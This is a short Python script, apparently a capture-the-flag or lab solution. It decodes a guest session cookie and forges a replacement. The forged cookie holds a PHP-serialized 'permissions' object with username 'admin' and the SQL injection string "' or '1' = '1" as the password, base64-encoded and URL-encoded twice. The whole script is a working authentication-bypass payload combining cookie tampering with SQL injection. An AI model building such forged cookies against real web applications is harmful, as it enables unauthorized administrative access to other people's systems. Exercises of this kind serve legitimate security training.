import urllib.parse
import base64

#cookie = "TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D"
#cookie = urllib.parse.unquote(cookie)
#cookie = urllib.parse.unquote(cookie)
#session = base64.b64decode(cookie)
#print(session)

session = b'O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:13:"\' or \'1\' = \'1";}'
cookie = base64.b64encode(session)
cookie = urllib.parse.quote(str(cookie))
cookie = urllib.parse.quote(str(cookie))
print(cookie)
